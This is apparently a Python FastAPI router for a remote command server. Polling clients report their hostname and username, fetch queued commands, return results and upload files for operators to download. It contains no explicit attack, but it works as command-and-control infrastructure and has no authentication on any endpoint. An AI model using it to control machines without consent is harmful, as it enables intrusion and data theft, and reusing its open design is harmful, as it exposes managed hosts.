from fastapi import APIRouter, File, UploadFile, HTTPException
from fastapi.responses import FileResponse
from routers.clients import command_queue
from routers.client_registry import update_client_status
from pydantic import BaseModel
from typing import Dict, Optional, List
from enum import Enum
import uuid
import time
import os
import shutil
from pathlib import Path

router = APIRouter()

# Create uploads directory if it doesn't exist
UPLOAD_DIR = Path("uploads")
UPLOAD_DIR.mkdir(exist_ok=True)

# Result types
class ResultType(str, Enum):
    TEXT = "text"           # Pure text result
    JSON = "json"           # JSON structured data  
    FILE = "file"           # Single file
    FILES = "files"         # Multiple files
    MIXED = "mixed"         # Text + files combination

# File information model
class FileInfo(BaseModel):
    filename: str
    size: int
    content_type: str
    upload_timestamp: float

# Command tracking structures
class CommandInfo(BaseModel):
    command_id: str
    stable_id: str
    command: str
    timestamp: float
    status: str  # 'pending', 'executing', 'completed', 'failed'
    result_type: ResultType = ResultType.TEXT
    result: Optional[str] = None
    result_timestamp: Optional[float] = None
    files: List[FileInfo] = []

class CommandRequest(BaseModel):
    client_id: str
    command: str

class CommandResult(BaseModel):
    command_id: str
    result: str
    status: str  # 'completed', 'failed'
    result_type: ResultType = ResultType.TEXT

# Global storage
command_history: Dict[str, CommandInfo] = {}
pending_commands: Dict[str, str] = {}  # stable_id -> command_id

@router.get("/next_command")
def get_next_command(client_id: str, hostname: str = None, username: str = None):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    # 更新客戶端狀態（如果提供了環境資訊）
    if hostname and username:
        stable_id = update_client_status(client_id, hostname, username)
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        print(f"Auto-registered stable ID: {stable_id}")
    
    command = command_queue[stable_id]
    if command:
        # 清除已發送的指令
        command_queue[stable_id] = None
        
        # Get command_id for this command
        command_id = pending_commands.get(stable_id)
        if command_id and command_id in command_history:
            # Update status to executing
            command_history[command_id].status = 'executing'
            print(f"Sending command to {stable_id}: {command} (ID: {command_id})")
            return {"command": command, "command_id": command_id}
        else:
            print(f"Sending command to {stable_id}: {command} (no ID)")
            return {"command": command}
    
    return {"command": None}

@router.post("/send_command")
def send_command(request: CommandRequest):
    """Send command to client using request body"""
    # client_id 現在是 stable_id
    stable_id = request.client_id
    command = request.command
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        
    # Generate command ID and store command info
    command_id = str(uuid.uuid4())
    timestamp = time.time()
    
    command_info = CommandInfo(
        command_id=command_id,
        stable_id=stable_id,
        command=command,
        timestamp=timestamp,
        status='pending'
    )
    
    command_history[command_id] = command_info
    pending_commands[stable_id] = command_id
    command_queue[stable_id] = command
    
    return {
        "status": f"Command queued for {stable_id}",
        "command_id": command_id,
        "timestamp": timestamp
    }

@router.post("/submit_result")
def submit_result(result_data: CommandResult):
    """Submit command execution result"""
    command_id = result_data.command_id
    
    if command_id not in command_history:
        return {"error": f"Command ID {command_id} not found"}
    
    # Update command info with result
    command_info = command_history[command_id]
    command_info.result = result_data.result
    command_info.status = result_data.status
    command_info.result_type = result_data.result_type
    command_info.result_timestamp = time.time()
    
    # Clear pending command for this client
    stable_id = command_info.stable_id
    if stable_id in pending_commands and pending_commands[stable_id] == command_id:
        del pending_commands[stable_id]
    
    print(f"Result received for {command_id}: {result_data.status} ({result_data.result_type})")
    return {"status": "Result submitted successfully", "command_id": command_id}

@router.get("/get_result/{command_id}")
def get_result(command_id: str):
    """Get command execution result by command ID"""
    if command_id not in command_history:
        return {"error": f"Command ID {command_id} not found"}
    
    return command_history[command_id]

@router.get("/command_history")
def get_command_history(stable_id: str = None, limit: int = 50):
    """Get command history, optionally filtered by stable_id"""
    history = list(command_history.values())
    
    if stable_id:
        history = [cmd for cmd in history if cmd.stable_id == stable_id]
    
    # Sort by timestamp (newest first)
    history.sort(key=lambda x: x.timestamp, reverse=True)
    
    return {
        "commands": history[:limit],
        "total": len(history)
    }

@router.post("/upload_files/{command_id}")
async def upload_files(command_id: str, files: List[UploadFile] = File(...)):
    """Upload files for a specific command result"""
    if command_id not in command_history:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    command_info = command_history[command_id]
    
    # Create command-specific directory
    command_dir = UPLOAD_DIR / command_id
    command_dir.mkdir(exist_ok=True)
    
    uploaded_files = []
    
    for file in files:
        if not file.filename:
            continue
            
        # Security: Clean filename to prevent path traversal
        safe_filename = os.path.basename(file.filename)
        file_path = command_dir / safe_filename
        
        # Save file
        try:
            with open(file_path, "wb") as buffer:
                content = await file.read()
                buffer.write(content)
                
            file_info = FileInfo(
                filename=safe_filename,
                size=len(content),
                content_type=file.content_type or "application/octet-stream",
                upload_timestamp=time.time()
            )
            
            command_info.files.append(file_info)
            uploaded_files.append(file_info)
            
        except Exception as e:
            print(f"Error uploading file {file.filename}: {str(e)}")
            continue
    
    # Update result type based on files
    if command_info.files:
        if command_info.result:
            command_info.result_type = ResultType.MIXED
        else:
            command_info.result_type = ResultType.FILES if len(command_info.files) > 1 else ResultType.FILE
    
    print(f"Uploaded {len(uploaded_files)} files for command {command_id}")
    return {
        "status": "Files uploaded successfully",
        "command_id": command_id,
        "uploaded_files": uploaded_files
    }

@router.get("/download_file/{command_id}/{filename}")
async def download_file(command_id: str, filename: str):
    """Download a specific file from command results"""
    if command_id not in command_history:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    command_info = command_history[command_id]
    
    # Check if file exists in command's file list
    file_exists = any(f.filename == filename for f in command_info.files)
    if not file_exists:
        raise HTTPException(status_code=404, detail=f"File {filename} not found for command {command_id}")
    
    file_path = UPLOAD_DIR / command_id / filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail=f"File {filename} not found on disk")
    
    return FileResponse(
        path=str(file_path),
        filename=filename,
        media_type='application/octet-stream'
    )

@router.get("/list_files/{command_id}")
def list_files(command_id: str):
    """List all files associated with a command"""
    if command_id not in command_history:
        raise HTTPException(status_code=404, detail=f"Command ID {command_id} not found")
    
    command_info = command_history[command_id]
    return {
        "command_id": command_id,
        "files": command_info.files,
        "total_files": len(command_info.files)
    }